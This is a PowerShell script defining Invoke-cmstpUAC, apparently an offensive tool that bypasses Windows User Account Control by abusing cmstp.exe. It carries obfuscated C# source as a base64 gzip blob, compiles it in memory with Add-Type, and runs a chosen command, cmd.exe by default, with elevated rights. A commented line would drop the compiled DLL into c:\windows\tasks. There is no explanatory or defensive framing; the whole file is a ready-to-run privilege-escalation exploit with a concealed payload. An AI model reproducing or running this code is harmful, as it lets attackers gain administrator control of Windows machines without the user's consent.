function Invoke-cmstpUAC {
    [CmdletBinding()]
    Param (
        [String] $cmd = "c:\windows\system32\cmd.exe"
    )
    # 
    # gzip -c Source_obfs.cs | base64 -w0
    $gzipB64 = "H4sICOSbiGgAA1NvdXJjZV9vYmZzLmNzAI1Xe2/aSBD/359iz2olW7GcV9PcHeV0vJKiQkCYlN4FVDn2AquatbW7Dokivntn7QU/cNxaCjg7M795zywxJ3SFnBcu8Kahxbn/7Cl+FqWj/qh00CXuioZcEI+XKJ1wE4UUUzEMfRwcEYMAe4KElNu3mGJGvBLHjFA/3JZBJzEVZIPtPhWYhZGD2RPxMHAhLYofA+IhL3A5R52hMx23XyJ41141BI8ic+GK5ItJ1D5ddl3hoib6V394woyDQQvNISvqipjh5jtvTTx3Fb7TWv6TSz3s9+9umhf2Feh76OKlGweiTwEzCBZaJ+Yi3HQxBAPEAakpTyRZnjmpu60guOegSANPxgw7WMQRRGrjUp83K86UmNT3NhVM7k3avcn0+3T0rdPvDPqd75NRe3QzaH3t32nC5T9+kCBAp/0huh1NvrRH9/+h0xsJWmPiQvvw19nZmSU/z5vyFML9fdDtdxWjha4lRAVloen65y+Doa5bSNed0c101pr05kPisZCHSzFX2Z13YsagRL6moZ+3ogiNXbEGwtoVnYAAzYagBinQmIVLEmAVccmYnr+/p/g5AtXY7zEWsvfpsa5L85wk1eCNKpY7d4Obuv51fAd0Zx0y4Tx5hUOk6bKgZNU8dIOgD3XMhKHHEJTLC9sPAt1clOoJOgUzih7DMECAuU39M6BMx4Kh9Yz6FiJUINrZ+JJuNurgLQRZHrhcJN5AdQoW43qdWNyEDK9YGFP/WLm59ydi5MkVuNQG7THo0L2/5/OtysucJ/12eTGf640aycdISkbAa2+8Z72BTk+9DReRjZ9xjdgqEetcTi6G9m3vWyIHPTu8nUAEet96NaJblwiOqS8BXie96d0ulX7t3U17k12V5IBw8Qmi/w/ahvQHCFK8zR2+frSurHPrwoJSty6ta+tyV+lyJhFVwkjxD9ZHADoHmCsA+tO6/hXU6g2oi8QWCXUFEG9PMEg8DLEb6ApDnajZMA17z9iLBTYT4XQIykexTYAn3EhBWftggmwnmMWiSDBM24kCIoxOSGFACnsaQmsyQ7d103w4WzTKuFMs69llL13CkiTnq0pOIq5nMmlvtmMS+JihUSyiWEjNKiIFsmFmchmnDSMDqsHIq61l1KGiaxmK/tdj2YQu82hFf8CFbMEc+6NoOfFMwJ7gKHA9bOh1kx0GxVG269HKY9VCM1jT8s9YRZasa/MXCPv9kRd9jKxtSTQJ04wRgWE9yIuEkQvfNEwjYZhWXkd2nANisO9gylVKp1y7qvZIpqKKye92BlkafyQaes/Qitxoj0+OXTQP7Jlgzs6lG3CcWb97ozRUz/6qzhXbvt5yzX7ky2HEywcWJdyKuCNcJiVCGRX1lmosM1T7mm9uxWi32CreQP1w2dynbox0dHKws5yaoijcKpw1DgJlMgCUoqWsshOzjINgwTW11dKR8hlCcIhiSsmrLjGlDPb/cHPMePywlMiSEMQ83actuNk8YaMuSju0XcusGkWMgmZTTfOkJgpXXRs2+Aach0x/wS/pywy2XaZyv/usVUmxKj55Tdj3BKpoChW7skuqPVT0k6lX6gxFelggyMkKC7kuVK5gY6hXzNsvycrIAzXy3ZUK2wNMV2It43Jm7k2vzE3KD1sGxs+SYb4u9kbizOx3CqHElOEOXULzxIK5s5os1tpddRvLg+U3RnZZzHNY6Oo4vceG7kdf5U3pUDZpT6JbK3fFGJhHN4I4uZTltvMS7p6GvLWS5lkDkU8D+NkGv7/g9eTELDZNIgsfJ+jWduLHFNEYPJCFdW5WjUPlUhwdHNlpPwFXCxrtiw4AAA==";
    $gzipBytes = [Convert]::FromBase64String($gzipB64);
    $gzipMemoryStream = New-Object IO.MemoryStream(, $gzipBytes);
    $gzipStream = New-Object System.IO.Compression.GzipStream($gzipMemoryStream, [IO.Compression.CompressionMode]::Decompress);
    $binaryMemoryStream = New-Object System.IO.MemoryStream;
    $gzipStream.CopyTo($binaryMemoryStream);
    $reader = [IO.StreamReader]::new($binaryMemoryStream)
    $binaryMemoryStream.Position = 0
    Add-Type -TypeDefinition $reader.ReadToEnd() -ReferencedAssemblies "System.Windows.Forms"
    # Add-Type -TypeDefinition $reader.ReadToEnd() -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly c:\windows\tasks\doosey.dll
    [CMSTPBypass]::Execute($cmd)
}